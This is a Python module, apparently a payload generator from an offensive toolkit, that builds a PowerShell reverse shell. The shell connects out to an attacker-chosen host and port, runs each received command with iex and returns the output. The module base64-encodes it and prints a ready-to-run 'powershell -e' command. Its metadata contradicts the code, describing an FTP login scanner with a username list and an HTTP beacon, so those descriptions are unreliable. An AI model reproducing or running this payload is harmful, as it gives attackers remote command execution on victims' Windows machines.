#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64

# Metadata الخاصة بأداة فحص FTP وتسجيل الدخول
metadata = {
    "name": "Windows PowerShell outfile SignalShell",
    "description": "An Http based beacon-like reverse shell that writes and executes commands from disc",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
    "license": "CIL",
    "references": [
        {
            "type": "url",
            "ref": ["https://github.com/t3l3machus/hoaxshell", "https://revshells.com"],
        },
    ],
    "options": {
        "lhost": {
            "type": "address",
            "description": "Target address",
            "required": True,
            "default": "0.0.0.0",
        },
        "lport": {
            "type": "int",
            "description": "FTP port",
            "required": False,
            "default": 6501,
        },
        "encode": {
            "type": "string",
            "description": "Path to file with list of usernames",
            "required": False,
            "default": "http",
        },
    },
}

class Encoder:
    @staticmethod
    def base64_encode(data):
        return base64.b64encode(data.encode('utf-16le')).decode('ascii')

def generate_payload(lhost, lport):
    # PowerShell payload
    script = f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}', {lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();"""
    encoded_script = Encoder.base64_encode(script)
    return encoded_script



def run(args):
    lhost = args.get("lhost", "0.0.0.0")
    lport = args.get("lport", 6501)
    encode = args.get("encode", "http")

    encoded_powershell_script = generate_payload(lhost, lport)
    executable_command = f"powershell -e {encoded_powershell_script}"
    print(executable_command)

